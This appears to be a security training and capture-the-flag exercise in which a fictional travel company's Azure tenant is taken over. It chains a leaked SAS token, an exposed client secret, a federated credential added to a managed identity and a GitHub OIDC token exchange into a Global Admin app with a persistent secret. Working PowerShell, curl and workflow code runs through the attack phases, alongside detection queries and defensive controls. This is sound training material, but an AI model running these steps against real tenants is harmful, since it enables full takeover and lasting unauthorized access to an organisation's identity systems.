# MC2 Connect: Complete Tenant Takeover via Exposed Configuration

## Overview

| Attribute | Details |
|-----------|---------|
| **Duration** | 60 minutes |
| **Difficulty** | Advanced |
| **Attack Type** | Multi-stage privilege escalation |
| **Final Objective** | Complete Entra ID tenant takeover |
| **Scenario Company** | Blue Mountain Travel Ltd. |

### Learning Objectives

1. Understand how exposed configuration files lead to complete compromise
2. Trace an attack path from anonymous access to Global Admin
3. Identify detection opportunities at each attack stage
4. Implement preventive controls and monitoring

---

## 🗺️ Attack Flow Diagram

```mermaid
flowchart LR
    subgraph Phase1["Phase 1: Anonymous<br/>(5 min)"]
        A1[Find-SubDomain]
        A2[Find-PublicStorageContainer]
        A3[Read-SASToken]
    end

    subgraph Phase2["Phase 2: Storage<br/>(10 min)"]
        B1[Enumerate Directories]
        B2[Download Config]
        B3[Extract Credentials]
    end

    subgraph Phase3["Phase 3: Azure Recon<br/>(10 min)"]
        C1[Connect-ServicePrincipal]
        C2[Get-RoleAssignment]
        C3[Get-ManagedIdentity]
        C4[Get-ServicePrincipalsPermission]
    end

    subgraph Phase4["Phase 4: UAMI<br/>(15 min)"]
        D1[Set-FederatedIdentity]
        D2[GitHub OIDC Token]
        D3[Exchange for UAMI Token]
    end

    subgraph Phase5["Phase 5: Takeover<br/>(5 min)"]
        E1[Add-EntraApplication]
        E2[Global Admin!]
    end

    Phase1 --> Phase2 --> Phase3 --> Phase4 --> Phase5

    style Phase1 fill:#e3f2fd,stroke:#1976d2
    style Phase2 fill:#fff3e0,stroke:#f57c00
    style Phase3 fill:#e8f5e9,stroke:#388e3c
    style Phase4 fill:#fce4ec,stroke:#c2185b
    style Phase5 fill:#ffebee,stroke:#d32f2f
```

### Attack Path Summary

```mermaid
flowchart TD
    A[👤 Anonymous Attacker] -->|DNS Enumeration| B[Storage Account Discovered]
    B -->|SAS Token Abuse| C[Config File Downloaded]
    C -->|Extract Credentials| D[App Secret Obtained]
    D -->|Connect-ServicePrincipal| E[Authenticated to Azure]
    E -->|Get-ManagedIdentity| F[🎯 UAMI Discovered]
    F -->|Get-ServicePrincipalsPermission| G[Application.ReadWrite.All Found]
    G -->|Set-FederatedIdentity| H[GitHub OIDC Trust Added]
    H -->|Token Exchange| I[UAMI Token Obtained]
    I -->|Add-EntraApplication| J[Global Admin Achieved]

    style A fill:#e3f2fd
    style J fill:#ffcdd2
    style G fill:#fff9c4
```

---

## ⏱️ Session Agenda (60 Minutes)

| Time | Phase | Activity |
|------|-------|----------|
| 0:00-0:05 | Introduction | Scenario background, company profile |
| 0:05-0:10 | Phase 1 | Anonymous Reconnaissance |
| 0:10-0:20 | Phase 2 | Storage Access & Credential Extraction |
| 0:20-0:30 | Phase 3 | Authenticated Azure Reconnaissance |
| 0:30-0:45 | Phase 4 | UAMI Exploitation & Federated Credential Abuse |
| 0:45-0:55 | Phase 5 | Tenant Takeover & Persistence |
| 0:55-1:00 | Wrap-up | Detections, Defenses, Key Takeaways |

---

## 🏢 Scenario Background

### Company Profile: Blue Mountain Travel Ltd.

Blue Mountain Travel is a UK-based travel agency undergoing digital transformation. They recently migrated their HR onboarding portal to Azure, using:

- **Azure App Service** for the HR portal
- **Azure Files** for onboarding document storage
- **Azure SQL** for HR database
- **User Assigned Managed Identity (UAMI)** for CI/CD automation
- **GitHub Actions** for deployment pipelines

### The Misconfiguration Timeline

```mermaid
timeline
    title How the Vulnerability Chain Was Created
    2025-06-15 : DevOps creates UAMI for CI/CD
               : UAMI gets Application.ReadWrite.All
    2025-09-20 : Developer commits .env.production to GitHub
               : Credentials exposed in git history
    2025-10-05 : Config files copied to Azure Files /config folder
               : Backup of credentials in storage
    2025-11-15 : Files "deleted" but soft-delete retains them
               : Configs accessible via recycle bin
    2025-12-20 : SAS token shared in email for "temporary" access
               : Token has 2+ year expiry with list permissions
    2026-01-21 : TODAY - Attacker discovers the chain
               : Attack begins
```

| Date | Event | Risk Created |
|------|-------|--------------|
| 2025-06-15 | DevOps creates UAMI for CI/CD | UAMI gets `Application.ReadWrite.All` |
| 2025-09-20 | Developer commits `.env.production` to GitHub | Credentials exposed in git history |
| 2025-10-05 | Config files copied to Azure Files `/config` folder | Backup of credentials in storage |
| 2025-11-15 | Files "deleted" but soft-delete retains them | Configs accessible via recycle bin |
| 2025-12-20 | SAS token shared in email for "temporary" access | Token has 2+ year expiry, list permissions |
| 2026-01-21 | **TODAY**: Attacker discovers the chain | Attack begins |

---

## 📁 Exposed Configuration File

### File Location in Storage Account

```
bluemountaintravelsa (Storage Account)
├── docs (File Share)
│   └── /config (Folder - "deleted" but in recycle bin)
│       └── app-config.json
```

### Minimal Exposed Configuration

**File: `/config/app-config.json`** (In recycle bin - minimal but enough to pivot)

```json
{
  "environment": "production",
  "azure": {
    "tenantId": "67f8647a-6555-4c70-bee4-45625d332c3f",
    "subscriptionId": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
  },
  "deployment": {
    "clientId": "1950a258-227b-4e31-a9cf-717495945fc2",
    "clientSecret": "Kvj8Q~9pL2mN4wR8vB3cH6jK1fE5gT0yU.aI7dO2"
  }
}
```

**Note:** This config only exposes an App Registration secret. The attacker must use authenticated reconnaissance to discover what this identity can access, and find the UAMI.

---

## 🎭 PHASE 1: Anonymous Reconnaissance (5 minutes)

### Attacker Actions

```powershell
# Step 1: DNS record discovery
Find-DnsRecord -Domain "bluemountaintravel.uk"

# Step 2: Find DNS records for azure resources
Find-AzurePublicResource -Name "bluemountaintravel"

# Step 3: Discover public storage containers
Find-PublicStorageContainer -StorageAccountName "bluemountaintravelsa"

# Step 4: If a SAS token is found (email, paste site, GitHub), analyze it
$sasToken = "?sv=2024-11-04&ss=f&srt=sco&sp=rl&se=2028-01-21..."
Read-SASToken -SASToken $sasToken

# Output shows:
#   Service: File
#   ResourceTypes: Service, Container, Object
#   Permissions: Read, List  <-- Can enumerate everything!
#   Expiry: 2028-01-21       <-- Valid for 2+ years!
```

### Discussion Points
- How was the SAS token discovered? (Email, paste site, git history, public repo)
- What makes this SAS token dangerous? (`srt=sco` + `sp=rl` = enumerate everything)
- What did `Read-SASToken` reveal about the token's capabilities?

### Detection Opportunities

| Detection | Log Source | Query |
|-----------|------------|-------|
| Unusual storage enumeration | Storage Analytics | High volume LIST operations from unknown IP |
| SAS token usage from unexpected location | Storage Analytics | GeoIP mismatch with expected regions |
| Directory listing API calls | Azure Monitor | `restype=directory&comp=list` in URLs |

---

## PHASE 2: Storage Access & Credential Extraction (10 minutes)

### Attacker Actions

```powershell
# Using the SAS token discovered in Phase 1
$storageAccount = "bluemountaintravelsa"
$fileShare = "docs"
$sasToken = "?sv=2024-11-04&ss=f&srt=sco&sp=rl..."

# Step 1: List root directory
$baseUrl = "https://$storageAccount.file.core.windows.net/$fileShare"
$listUrl = "$baseUrl`?restype=directory&comp=list&$sasToken"
$directories = Invoke-RestMethod -Uri $listUrl

# Discovers: /config folder (even if "deleted" - soft-delete retains it)

# Step 2: List config folder contents
$configUrl = "$baseUrl/config?restype=directory&comp=list&$sasToken"
$configFiles = Invoke-RestMethod -Uri $configUrl

# Step 3: Download the configuration file
$configFileUrl = "$baseUrl/config/app-config.json$sasToken"
Invoke-RestMethod -Uri $configFileUrl -OutFile "app-config.json"

# Step 4: Extract credentials
$config = Get-Content app-config.json | ConvertFrom-Json
$tenantId = $config.azure.tenantId
$subscriptionId = $config.azure.subscriptionId
$clientId = $config.deployment.clientId
$clientSecret = $config.deployment.clientSecret

Write-Host "Found credentials for App: $clientId in tenant: $tenantId"
```

### What Was Found

| Secret | Value | Next Step |
|--------|-------|-----------|
| Tenant ID | `67f8647a-6555-...` | Target tenant identified |
| Subscription ID | `a1b2c3d4-e5f6-...` | Azure scope for enumeration |
| Client ID | `1950a258-227b-...` | App Registration to authenticate as |
| Client Secret | `Kvj8Q~9pL2...` | Credential to authenticate |

**Key Question:** What can this App Registration do? We need to authenticate and find out!

### Detection Opportunities

| Detection | Log Source | Alert |
|-----------|------------|-------|
| Access to soft-deleted items | Storage Analytics | Access to files in `$deleted` paths |
| Bulk file downloads | Storage Analytics | Multiple GET operations in short window |
| Config file access patterns | Storage Analytics | Access to `*.json`, `*.yaml`, `*.env` files |

---

## PHASE 3: Authenticated Azure Reconnaissance (10 minutes)

**This is the critical discovery phase using BlackCat functions!**

### Step 1: Authenticate with Stolen Credentials

```powershell
# Connect using the stolen App Registration credentials
Connect-ServicePrincipal `
    -ServicePrincipalId "1950a258-227b-4e31-a9cf-717495945fc2" `
    -TenantId "67f8647a-6555-4c70-bee4-45625d332c3f" `
    -ClientSecret "Kvj8Q~9pL2mN4wR8vB3cH6jK1fE5gT0yU.aI7dO2" `
    -SubscriptionId "a1b2c3d4-e5f6-7890-abcd-ef1234567890"

# Output shows:
#   DisplayName: HR-Onboarding-Legacy-Deployment
#   Roles: Contributor (subscription scope!)
```

### Step 2: Discover What We Can Access

```powershell
# Check our role assignments - what can this SP do?
Get-RoleAssignment -CurrentUser

# Output:
# RoleName          Scope                           PrincipalType
# --------          -----                           -------------
# Contributor       /subscriptions/a1b2c3d4...      ServicePrincipal

# Contributor on entire subscription = we can modify resources!
```

### Step 3: Enumerate Managed Identities

```powershell
# Find all User Assigned Managed Identities in the subscription
Get-ManagedIdentity

# Output:
# Name                      ResourceGroup          ClientId                              Location
# ----                      -------------          --------                              --------
# uami-hr-cicd-automation   rg-hr-infrastructure   3fa85f64-5717-4562-b3fc-2c963f66afa6  uksouth
# uami-backup-service       rg-shared-services     8b2e4f91-...                          uksouth

# The CI/CD automation identity is interesting - let's check its permissions!
```

### Step 4: Analyze UAMI Permissions

```powershell
# Check what Graph API permissions the UAMI has
Get-ServicePrincipalsPermission -ServicePrincipalId "3fa85f64-5717-4562-b3fc-2c963f66afa6"

# Output:
# DisplayName: uami-hr-cicd-automation
# 
# Application Permissions:
#   Permission                          ResourceApp
#   ----------                          -----------
#   Application.ReadWrite.All           Microsoft Graph    ← DANGEROUS!
#   AppRoleAssignment.ReadWrite.All     Microsoft Graph    ← DANGEROUS!
#   User.Read.All                       Microsoft Graph
#
# These permissions allow creating App Registrations and assigning permissions!
```

### Step 5: Check for Existing Federated Credentials

```powershell
# Get any federated identity credentials on the UAMI
# (Need to query Azure Resource Manager for this)
$uamiId = "/subscriptions/a1b2c3d4-e5f6-7890-abcd-ef1234567890/resourceGroups/rg-hr-infrastructure/providers/Microsoft.ManagedIdentity/userAssignedIdentities/uami-hr-cicd-automation"

$ficUrl = "https://management.azure.com$uamiId/federatedIdentityCredentials?api-version=2023-01-31"
$existingFics = Invoke-RestMethod -Uri $ficUrl -Headers $script:authHeader

# Output shows existing GitHub trust:
#   Name: github-actions-main
#   Subject: repo:blue-mountain-travel/hr-onboarding-portal:ref:refs/heads/main
#   Issuer: https://token.actions.githubusercontent.com

# This UAMI already trusts GitHub - we can add another federated credential!
```

### Key Findings Summary

| Discovery | Implication |
|-----------|-------------|
| SP has Contributor on subscription | Can modify any Azure resource, including UAMIs |
| UAMI exists with Application.ReadWrite.All | Can create apps and assign Graph permissions |
| UAMI already has GitHub FIC | Pattern is established, another FIC won't be suspicious |
| AppRoleAssignment.ReadWrite.All | Can assign any permission to service principals |

### Discussion Points
- What made `Get-ManagedIdentity` so valuable?
- Why is Contributor + UAMI with Graph permissions a devastating combination?
- How would you detect this enumeration activity?

### Detection Opportunities

| Detection | Log Source | Alert |
|-----------|------------|-------|
| Service principal sign-in | Entra ID Sign-in Logs | Login from unexpected IP/location |
| Enumeration of managed identities | Azure Activity Log | List operations on Microsoft.ManagedIdentity |
| Graph API permission queries | Entra ID Audit Logs | Reading appRoleAssignments |

---

## PHASE 4: UAMI Exploitation via Federated Credentials (15 minutes)

### Understanding the Attack Chain

```mermaid
flowchart TD
    A[Attacker's GitHub Repository] -->|1. Workflow triggers| B[GitHub OIDC Token]
    
    subgraph Azure["Azure / Entra ID"]
        C[UAMI with FIC]
        D[UAMI Access Token]
        E[Microsoft Graph API]
    end
    
    B -->|2. Token Exchange| C
    C -->|3. Issues token with| D
    D -->|4. Has Application.ReadWrite.All| E
    E -->|5. Create App + Global Admin| F[Tenant Takeover]

    subgraph Prerequisite["Prerequisite: Add FIC to UAMI"]
        P1[SP with Contributor] -->|Set-FederatedIdentity| P2[Trust attacker's repo]
    end

    P2 -.->|Enables| A

    style A fill:#24292e,color:#fff
    style F fill:#ffcdd2
    style C fill:#e3f2fd
    style D fill:#c8e6c9
```

### Permission Boundary Crossing

```mermaid
flowchart LR
    subgraph AzureRBAC["Azure RBAC Boundary"]
        AR1[Contributor Role]
        AR2[Modify UAMI Resource]
        AR3[Add Federated Credential]
    end

    subgraph EntraID["Entra ID Boundary"]
        EI1[UAMI Service Principal]
        EI2[Application.ReadWrite.All]
        EI3[Create App Registrations]
        EI4[Assign Directory Roles]
    end

    AR1 --> AR2 --> AR3
    AR3 -->|"Crosses Boundary!"| EI1
    EI1 --> EI2 --> EI3 --> EI4

    style AR3 fill:#fff9c4,stroke:#f57f17
    style EI1 fill:#fff9c4,stroke:#f57f17
```

### Step 1: Add Federated Credential to UAMI

```powershell
# Use BlackCat's Set-FederatedIdentity to add attacker's GitHub repo
# The SP from Phase 3 has Contributor on the subscription = can modify UAMI

$uamiId = "/subscriptions/a1b2c3d4-e5f6-7890-abcd-ef1234567890/resourceGroups/rg-hr-infrastructure/providers/Microsoft.ManagedIdentity/userAssignedIdentities/uami-hr-cicd-automation"

Set-FederatedIdentity `
    -Id $uamiId `
    -Name "github-backup-automation" `
    -GitHubOrganization "attacker-org" `
    -GitHubRepository "malicious-repo" `
    -Branch "main"

# This creates a trust: UAMI now accepts tokens from attacker's GitHub repo
```

### Step 2: Create GitHub Actions Workflow (Attacker's Repository)

```yaml
# .github/workflows/exploit.yml
name: Azure Access
on: workflow_dispatch

permissions:
  id-token: write
  contents: read

env:
  AZURE_TENANT_ID: "67f8647a-6555-4c70-bee4-45625d332c3f"
  UAMI_CLIENT_ID: "3fa85f64-5717-4562-b3fc-2c963f66afa6"

jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - name: Get GitHub OIDC Token
        id: oidc
        run: |
          OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
            -H "Accept: application/json" \
            -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" | jq -r '.value')
          echo "::add-mask::$OIDC_TOKEN"
          echo "oidc_token=$OIDC_TOKEN" >> $GITHUB_OUTPUT
      
      - name: Exchange for UAMI Token (Graph API scope)
        run: |
          GRAPH_TOKEN=$(curl -sX POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "client_id=$UAMI_CLIENT_ID" \
            -d "grant_type=client_credentials" \
            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
            -d "client_assertion=${{ steps.oidc.outputs.oidc_token }}" \
            -d "scope=https://graph.microsoft.com/.default" | jq -r '.access_token')
          
          # Now we have a token with Application.ReadWrite.All!
          echo "Got Graph token for UAMI - ready for Phase 5"
```

### Discussion Points
- Why can Contributor role modify UAMI federated credentials?
- What's the difference between Azure RBAC and Entra ID permissions?
- Why is this a "permission boundary crossing" attack?
- How would legitimate security teams detect a new FIC?

### Detection Opportunities

| Detection | Log Source | Alert |
|-----------|------------|-------|
| New Federated Credential | Azure Activity Log | `Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write` |
| Unknown GitHub repository | Entra ID Sign-in Logs | Federated sign-in from unexpected issuer/subject |
| UAMI token for Graph API | Entra ID Sign-in Logs | Service principal authentication to Graph |
| Service principal auth from unexpected IP | Entra ID Sign-in Logs | GeoIP anomaly for service principal |

---

## PHASE 5: Tenant Takeover (5 minutes)

### Using BlackCat's Add-EntraApplication

The UAMI token (obtained via GitHub OIDC exchange) has `Application.ReadWrite.All`. BlackCat has a function specifically for this:

```powershell
# After authenticating with the UAMI token from GitHub Actions,
# use BlackCat's Add-EntraApplication to create a malicious app with Global Admin

Add-EntraApplication -DisplayName "Azure-Backup-Automation-Service"

# This function automatically:
# 1. Creates an App Registration
# 2. Creates a Service Principal
# 3. Assigns Global Administrator role to the Service Principal
# 4. Returns the App details for credential creation
```

### Output from Add-EntraApplication

```
DisplayName                 : Azure-Backup-Automation-Service
ApplicationId               : 9a8b7c6d-5e4f-3210-fedc-ba0987654321
ApplicationObjectId         : abc12345-6789-0def-1234-567890abcdef
ServicePrincipalObjectId    : def98765-4321-0fed-cba9-876543210fed
RoleAssignmentName          : Global Administrator
RoleTemplateId              : 62e90394-69f5-4237-9190-012177145e10
```

### Creating Persistence (Client Secret)

```powershell
# Add a client secret to the newly created app for persistent access
# (Manual step - BlackCat function uses role assignment approach)

$secretBody = @{
    passwordCredential = @{
        displayName = "Backup Key"
        endDateTime = (Get-Date).AddYears(2).ToString("o")
    }
} | ConvertTo-Json

$secret = Invoke-RestMethod `
    -Uri "https://graph.microsoft.com/v1.0/applications/$appObjectId/addPassword" `
    -Method POST `
    -Headers @{ Authorization = "Bearer $graphToken"; "Content-Type" = "application/json" } `
    -Body $secretBody

# Now attacker has persistent access via:
# - ClientId: 9a8b7c6d-5e4f-3210-fedc-ba0987654321
# - ClientSecret: (returned by addPassword)
# - This app has Global Administrator!
```

### Attack Complete - What Was Achieved

| Achievement | Details |
|-------------|---------|
| **Global Admin SP** | "Azure-Backup-Automation-Service" with GA role |
| **Persistent Secret** | 2-year client secret for continued access |
| **Independent Access** | Works even if UAMI/GitHub access is revoked |
| **Stealthy Name** | Looks like legitimate backup automation |

### Persistence Mechanisms Created

| Mechanism | Description | Detection Difficulty |
|-----------|-------------|---------------------|
| Malicious App Registration | "Azure-Backup-Automation-Service" with admin permissions | Medium |
| Client Secret | 2-year validity, named "Backup Key" | Low (if audited) |
| Federated Credential on UAMI | Persistent GitHub → Azure access | Medium |
| Global Admin Assignment | App's SP is now tenant admin | Easy (if monitored) |

### Discussion Points
- Why is creating a new App more stealthy than modifying existing ones?
- What makes `Application.ReadWrite.All` so dangerous on UAMI?
- How can the attacker maintain access even if the UAMI is deleted?
- What would be the business impact of this compromise?

### Detection Opportunities

| Detection | Log Source | Alert Priority |
|-----------|------------|----------------|
| New App Registration | Entra ID Audit Logs | Critical |
| Global Admin role assignment | Entra ID Audit Logs | Critical |
| Service principal sign-in from new app | Entra ID Sign-in Logs | High |
| Client secret added to application | Entra ID Audit Logs | High |

---

## 🛡️ DEFENSES & DETECTIONS (Summary)

```mermaid
flowchart TD
    subgraph Prevention["Prevention Layer"]
        P1[No List-enabled SAS Tokens]
        P2[Private Endpoints for Storage]
        P3[Credential Scanning in CI/CD]
        P4[Least Privilege UAMIs]
        P5[Azure Policy: Block FIC creation]
    end
    
    subgraph Detection["Detection Layer"]
        D1[Storage Analytics Logs]
        D2[Azure Activity Logs]
        D3[Entra ID Audit Logs]
        D4[Entra ID Sign-in Logs]
        D5[Microsoft Sentinel Rules]
    end
    
    subgraph Response["Response Layer"]
        R1[Revoke SAS Tokens]
        R2[Rotate Storage Keys]
        R3[Delete Malicious Apps]
        R4[Remove FIC from UAMI]
        R5[Forensic Investigation]
    end
    
    P1 & P2 --> |"If bypassed"| D1 & D2
    P3 & P4 --> |"If bypassed"| D3 & D4
    P5 --> |"If bypassed"| D2 & D3
    
    D1 & D2 & D3 & D4 --> D5
    D5 --> |"Alert triggers"| R1 & R2 & R3 & R4 & R5
    
    style Prevention fill:#90EE90
    style Detection fill:#FFD700
    style Response fill:#FF6B6B
```

### Preventive Controls

| Control | Phase Blocked | Implementation |
|---------|---------------|----------------|
| **No SAS tokens with List permission** | Phase 1 | Use Azure AD authentication, or service-level SAS |
| **Disable soft-delete public access** | Phase 2 | Private endpoints, disable anonymous access |
| **Rotate/revoke exposed credentials** | Phase 3 | Secret scanning, credential monitoring |
| **Limit UAMI permissions** | Phase 3-4 | No `Application.ReadWrite.All` on UAMIs |
| **Restrict federated credential creation** | Phase 4 | Azure Policy, custom RBAC roles |
| **PIM for sensitive Graph permissions** | Phase 5 | Require approval for permission assignments |

### Detection Rules (KQL)

```kusto
// 1. Federated Credential Addition to UAMI
AzureActivity
| where OperationNameValue contains "federatedIdentityCredentials/write"
| project TimeGenerated, Caller, ResourceId, Properties

// 2. App Registration with Dangerous Permissions
AuditLogs
| where OperationName == "Add app role assignment to service principal"
| where TargetResources[0].modifiedProperties contains "RoleManagement.ReadWrite.Directory"
   or TargetResources[0].modifiedProperties contains "Application.ReadWrite.All"

// 3. Global Admin Assignment
AuditLogs
| where OperationName == "Add member to role"
| where TargetResources[0].modifiedProperties contains "62e90394-69f5-4237-9190-012177145e10"

// 4. New App with Client Secret in Short Window
AuditLogs
| where TimeGenerated > ago(1h)
| where OperationName in ("Add application", "Add service principal credentials")
| summarize Operations = make_set(OperationName) by TargetResources[0].displayName
| where array_length(Operations) >= 2
```

### Incident Response Playbook

| Step | Action | Owner |
|------|--------|-------|
| 1 | Revoke all SAS tokens for affected storage | Storage Admin |
| 2 | Rotate storage account keys | Storage Admin |
| 3 | Remove unauthorized federated credentials from UAMI | Identity Admin |
| 4 | Delete malicious App Registration | Global Admin |
| 5 | Revoke Global Admin from attacker user | Global Admin |
| 6 | Review all UAMI permissions tenant-wide | Security Team |
| 7 | Enable PIM for sensitive Graph permissions | Security Team |
| 8 | Forensic analysis of attacker actions | Incident Response |

---

## Key Takeaways

### For Blue Teams

1. **SAS tokens are credentials** - Treat them like passwords, audit their permissions with `Read-SASToken`
2. **Soft-delete ≠ secure delete** - Retention policies don't protect from enumeration
3. **Reconnaissance matters** - Use `Get-RoleAssignment`, `Get-ManagedIdentity`, `Get-ServicePrincipalsPermission` to understand attacker perspective
4. **UAMI permissions are dangerous** - `Application.ReadWrite.All` enables tenant takeover
5. **Federated credentials create trust** - Monitor additions, restrict who can create them
6. **Detection must be multi-layer** - Storage, Azure Activity, Entra ID all have signals

### For Red Teams

1. **Minimal config → Full access** - A single app secret can unlock the entire tenant via proper recon
2. **Use BlackCat for enumeration** - `Connect-ServicePrincipal` → `Get-RoleAssignment` → `Get-ManagedIdentity` → `Get-ServicePrincipalsPermission`
3. **Permission boundary crossing** - Contributor (Azure RBAC) + UAMI with Graph permissions = Entra ID access
4. **GitHub OIDC is stealthy** - `Set-FederatedIdentity` creates persistent access without stored secrets
5. **`Add-EntraApplication`** - Creates app + SP + Global Admin in one command

### For Architects

1. **Use service-level SAS** - Not account/share level with list permissions
2. **Private endpoints** - Eliminate anonymous access to storage entirely
3. **Least privilege UAMIs** - Separate UAMIs for different purposes, never grant `Application.ReadWrite.All`
4. **Monitor federated credentials** - Alert on any additions to managed identities
5. **PIM for Graph permissions** - Require approval for sensitive permission assignments

---

## BlackCat Functions Used

| Phase | Function | Purpose |
|-------|----------|---------|
| 1 | `Find-SubDomain` | Discover Azure resources via DNS |
| 1 | `Find-DnsRecords` | Enumerate DNS records |
| 1 | `Find-PublicStorageContainer` | Find publicly accessible storage |
| 1 | `Read-SASToken` | Analyze SAS token permissions |
| 3 | `Connect-ServicePrincipal` | Authenticate with stolen credentials |
| 3 | `Get-RoleAssignment` | Discover RBAC permissions |
| 3 | `Get-ManagedIdentity` | Enumerate UAMIs |
| 3 | `Get-ServicePrincipalsPermission` | Check Graph API permissions |
| 4 | `Set-FederatedIdentity` | Add GitHub OIDC trust to UAMI |
| 5 | `Add-EntraApplication` | Create app with Global Admin |

---

## Exercise Materials

| File | Purpose |
|------|---------|
| [app-config.json](vulnerable-configs/app-config.json) | Minimal exposed config (starting point) |
| [deployment-config.yaml](vulnerable-configs/deployment-config.yaml) | Full config (for reference) |
| [.env.production](vulnerable-configs/.env.production) | Environment variables |
| [uami-usage.yaml](../uami-usage.yaml) | GitHub Actions workflow example |

---

## Flags

Participants should capture these flags during the exercise:

| Flag | Location | Difficulty |
|------|----------|------------|
| `BlackCat{SAS_T0k3ns_4r3_P0w3rfu1_4cc3ss_Kr3d3nt14ls}` | Storage account | Easy |
| `BlackCat{0nb04rd1ng_D0cs_3xp0s3d_V1a_S4S_T0k3n}` | Welcome.html documents | Easy |
| `BlackCat{F3d3r4t3d_Cr3d3nt14l_Pr1v1l3g3_3sc4l4t10n}` | UAMI federated credential | Medium |
| `BlackCat{Gl0b4l_Adm1n_V1a_App_R3g1str4t10n}` | Tenant takeover completion | Hard |

---

*Exercise created for security awareness training. All credentials are fictional.*
